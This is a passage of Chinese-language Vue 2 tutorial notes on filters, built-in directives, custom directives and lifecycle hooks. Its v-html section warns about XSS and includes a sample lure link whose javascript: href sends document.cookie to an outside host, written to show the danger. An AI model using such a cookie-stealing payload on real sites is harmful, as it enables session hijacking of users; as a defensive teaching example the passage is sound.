function_">format</span>(<span class="string">&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">getFmtTime</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="title function_">dayjs</span>(<span class="variable language_">this</span>.<span class="property">time</span>).<span class="title function_">format</span>(<span class="string">&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//局部过滤器</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">filters</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">timeFormater</span>(<span class="params">value,str=<span class="string">&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;</span></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// console.log(&#x27;@&#x27;,value)</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="title function_">dayjs</span>(value).<span class="title function_">format</span>(str)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root2&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">msg</span>:<span class="string">&#x27;hello,atguigu!&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="内置指令"><a href="#内置指令" class="headerlink" title="内置指令"></a>内置指令</h2><h3 id="v-text指令"><a href="#v-text指令" class="headerlink" title="v-text指令"></a>v-text指令</h3><ul><li>已学过指令<ul><li>v-bind    : 单向绑定解析表达式, 可简写为 :xxx</li><li>v-model    : 双向数据绑定</li><li>v-for      : 遍历数组/对象/字符串</li><li>v-on       : 绑定事件监听, 可简写为@</li><li>v-if     : 条件渲染（动态控制节点是否存存在）</li><li>v-else     : 条件渲染（动态控制节点是否存存在）</li><li>v-show     : 条件渲染 (动态控制节点是否展示)</li></ul></li><li>v-text指令：<ul><li>1.作用：向其所在的节点中渲染文本内容。</li><li>2.与插值语法的区别：v-text会替换掉节点中的内容，则不会。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">str</span>:<span class="string">&#x27;&lt;h3&gt;你好啊！&lt;/h3&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="v-html指令"><a href="#v-html指令" class="headerlink" title="v-html指令"></a>v-html指令</h3><ul><li>1.作用：向指定节点中渲染包含html结构的内容。</li><li>2.与插值语法的区别：<ul><li>(1).v-html会替换掉节点中所有的内容，则不会。</li><li>(2).v-html可以识别html结构。</li></ul></li><li>3.严重注意：v-html有安全性问题！！！！<ul><li>(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。</li><li>(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">str</span>:<span class="string">&#x27;&lt;h3&gt;你好啊！&lt;/h3&gt;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">str2</span>:<span class="string">&#x27;&lt;a href=javascript:location.href=&quot;http://www.baidu.com?&quot;+document.cookie&gt;兄弟我找到你想要的资源了，快来！&lt;/a&gt;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="v-cloak指令"><a href="#v-cloak指令" class="headerlink" title="v-cloak指令"></a>v-cloak指令</h3><ul><li>1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。</li><li>2.使用css配合v-cloak可以解决网速慢时页面展示出的问题。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>v-cloak指令<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-attr">[v-cloak]</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">display</span>:none;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">v-cloak指令（没有值）：</span></span><br><span class="line"><span class="comment">1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。</span></span><br><span class="line"><span class="comment">2.使用css配合v-cloak可以解决网速慢时页面展示出&#123;&#123;xxx&#125;&#125;的问题。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-cloak</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/resource/5s/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="v-once指令"><a href="#v-once指令" class="headerlink" title="v-once指令"></a>v-once指令</h3><ul><li>1.v-once所在节点在初次动态渲染后，就视为静态内容了。</li><li>2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-once</span>&gt;</span>初始化的n值是:&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是:&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">n</span>:<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="v-pre指令"><a href="#v-pre指令" class="headerlink" title="v-pre指令"></a>v-pre指令</h3><ul><li>1.跳过其所在节点的编译过程。</li><li>2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-pre</span>&gt;</span>Vue其实很简单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> &gt;</span>当前的n值是:&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">n</span>:<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a>自定义指令</h2><h3 id="自定义指令总结："><a href="#自定义指令总结：" class="headerlink" title="自定义指令总结："></a>自定义指令总结：</h3><ul><li>定义语法：<ul><li>(1).局部指令：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">   <span class="attr">directives</span>:&#123;指令名:配置对象&#125;   </span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">   <span class="attr">directives</span>:&#123;指令名:回调函数&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li>(2).全局指令：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(指令名,配置对象) </span><br><span class="line"><span class="comment">// 或   </span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(指令名,回调函数)</span><br></pre></td></tr></table></figure></li></ul></li><li>配置对象中常用的3个回调：<ul><li>(1).bind：指令与元素成功绑定时调用。</li><li>(2).inserted：指令所在元素被插入页面时调用。</li><li>(3).update：指令所在模板结构被重新解析时调用。</li></ul></li><li>备注：<ul><li>1.指令定义时不加v-，但使用时要加v-；</li><li>2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-text</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;h2&gt;放大10倍后的n值是：&lt;span v-big-number=&quot;n&quot;&gt;&lt;/span&gt; &lt;/h2&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>放大10倍后的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-big</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-fbind:value</span>=<span class="string">&quot;n&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//定义全局指令</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">/* Vue.directive(&#x27;fbind&#x27;,&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      //指令与元素成功绑定时（一上来）</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      bind(element,binding)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">          element.value = binding.value</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      &#125;,</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      //指令所在元素被插入页面时</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      inserted(element,binding)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">          element.focus()</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      &#125;,</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      //指令所在的模板被重新解析时</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      update(element,binding)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">          element.value = binding.value</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      &#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  &#125;) */</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">n</span>:<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">directives</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">/* &#x27;big-number&#x27;(element,binding)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">          // console.log(&#x27;big&#x27;)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">          element.innerText = binding.value * 10</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      &#125;, */</span></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">big</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;big&#x27;</span>,<span class="variable language_">this</span>) <span class="comment">//注意此处的this是window</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// console.log(&#x27;big&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">        element.<span class="property">innerText</span> = binding.<span class="property">value</span> * <span class="number">10</span></span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">fbind</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//指令与元素成功绑定时（一上来）</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">bind</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          element.<span class="property">value</span> = binding.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//指令所在元素被插入页面时</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">inserted</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          element.<span class="title function_">focus</span>()</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//指令所在的模板被重新解析时</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">update</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          element.<span class="property">value</span> = binding.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="回顾一个DOM操作"><a href="#回顾一个DOM操作" class="headerlink" title="回顾一个DOM操作"></a>回顾一个DOM操作</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.demo</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>点我创建一个输入框<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">btn.<span class="property">onclick</span> = <span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> input = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;input&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">input.<span class="property">className</span> = <span class="string">&#x27;demo&#x27;</span></span></span><br><span class="line"><span class="language-javascript">input.<span class="property">value</span> = <span class="number">99</span></span></span><br><span class="line"><span class="language-javascript">input.<span class="property">onclick</span> = <span class="function">()=&gt;</span>&#123;<span class="title function_">alert</span>(<span class="number">1</span>)&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(input)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">input.<span class="title function_">focus</span>()</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// input.parentElement.style.backgroundColor = &#x27;skyblue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(input.<span class="property">parentElement</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><h3 id="引出生命周期"><a href="#引出生命周期" class="headerlink" title="引出生命周期"></a>引出生命周期</h3><ul><li>1.又名：生命周期回调函数、生命周期函数、生命周期钩子。</li><li>2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。</li><li>3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。</li><li>4.生命周期函数中的this指向是vm 或 组件实例对象。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>分析生命周期<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 